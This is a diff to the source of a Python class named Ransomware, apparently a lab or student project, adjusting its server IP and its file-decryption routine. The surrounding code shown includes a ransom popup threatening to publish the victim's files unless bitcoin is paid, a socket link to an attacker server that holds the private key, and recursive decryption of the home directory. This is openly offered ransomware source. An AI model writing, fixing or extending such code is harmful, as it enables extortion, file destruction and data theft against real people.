@@ -11,9 +11,10 @@ import math
 import rsa
 import requests
 import re
+import tempfile
 
 class Ransomware: 
-    SERVER_IP = "10.0.2.5"
+    SERVER_IP = "10.0.2.15"
     ENCODING = "utf-8"
     MAX_SIZE = 4096
 
@@ -230,9 +231,6 @@ class Ransomware:
         #Update the amount of bitcoin that we want glboabbly
         self.calulate_bitcoin(size_of_files)
 
-
-
-
     def decrypt_file(self, file_path, key):
         with open(file_path, "rb") as file:
             encrypted_contents = file.read()
@@ -241,23 +239,31 @@ class Ransomware:
         # Read the encrypted message in chunks
         for i in range(0, len(encrypted_contents), 256):
             chunk = encrypted_contents[i:i+256]
-            dec_chunk = rsa.decrypt(chunk, key)
 
-            # Update the file with the decrypted contents
-            if not opened:
-                with open(file_path, "wb") as file:
-                    file.write(dec_chunk)
-                    opened = True
-            else:
-                with open(file_path, "ab") as file:
-                    file.write(dec_chunk)
+            try:
+                dec_chunk = rsa.decrypt(chunk, key)
 
+                # Update the file with the decrypted contents
+                if not opened:
+                    with open(file_path, "wb") as file:
+                        file.write(dec_chunk)
+                        opened = True
+                else:
+                    with open(file_path, "ab") as file:
+                        file.write(dec_chunk)
+                
+            except:
+                print('Sorry-----------------------')
+                print(file_path)
+
+            
     def decrypt_all_files(self, directory, key):
         dir_list = self.list_safe_directories(directory)
         for dir in dir_list:
             for file in self.get_files_in_dir(dir):
-                file_path = os.path.join(dir, file)
-                self.decrypt_file(file_path, key)
+                if not os.path.exists(os.path.join(dir, 'private_key.pem')):
+                    file_path = os.path.join(dir, file)
+                    self.decrypt_file(file_path, key)
 
     def execute_attack(self):
         
@@ -303,7 +309,6 @@ class Ransomware:
             seconds = int(remaining_time % 60)
 
 
-
             # Text to be displayed on the pop up
             text = f"HAHAHAHA, all your files are encrypted and stored on our server!\n If you pay us in the next <b>{hours:02d}:{minutes:02d}:{seconds:02d}</b> we will decrypt your files and delete our copy.\n If you do not pay us, the files will be published to the internet for all to see.\n DO NOT TURN OFF YOUR COMPUTER - WE WILL CONSDIER THIS AS NON PAYMENT \nTransfer: {bitcoin_needed} btc to {wallet_address}"
 
@@ -317,7 +322,6 @@ class Ransomware:
             popup.send_signal(signal.SIGTERM)
 
 
-
             #User has paid before the time ran out
             # self.check_if_user_has_paid()
             if (True):
@@ -328,7 +332,7 @@ class Ransomware:
                 popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been received! \n Decrypting all files.","--width", "400", "--height", "200" ])
             
                 """ Receiving the private key. """
-                filename = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
+                filename = base64.b64decode(self._socket.recv(2048)).decode("utf-8")
                 filename = 'private_key.pem'
                 print(f"[RECV] Receiving the private key")
                 print("filename: " + filename)
@@ -340,7 +344,6 @@ class Ransomware:
                 data = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE))
                 print(data)
                 print(type(data))
-                key.write(data)
             
                 print(f"[RECV] Receiving the private key data.")
                 key.write(data)
@@ -352,10 +355,11 @@ class Ransomware:
                 #Read the private key from the server
                 #I am not sure where to put this above, so I will leave it here for now
                 with open("private_key.pem", "rb") as key_content:
-                    print(key_content.read())
                     key = rsa.PrivateKey.load_pkcs1(key_content.read())
 
                 self.decrypt_all_files(home, key)
+
+                break
             
                 #TODO: Implement code to delete all the files that are stored on the server
 
@@ -375,4 +379,3 @@ if __name__ == '__main__':
 
     # Start the attack
     ransomware.execute_attack()
-
